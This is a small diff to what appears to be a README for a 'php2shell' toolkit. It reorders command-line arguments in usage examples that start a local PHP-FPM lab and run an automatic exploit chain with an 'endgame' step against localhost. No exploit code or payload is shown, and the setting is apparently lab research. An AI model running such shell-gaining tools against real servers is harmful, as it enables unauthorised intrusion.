@@ -161,8 +161,9 @@ python3 tools/php2shell_fpm_labs.py up --version 8.4.26
 python3 tools/php2shell_auto.py -u http://127.0.0.1:8110/index.php --sapi fpm \
   --builder http://127.0.0.1:8111
 # or drive the chain directly:
-python3 tools/php2shell_fpm.py endgame \
-  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26
+python3 tools/php2shell_fpm.py \
+  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 \
+  endgame
 python3 tools/php2shell_fpm_labs.py down
 ```
 
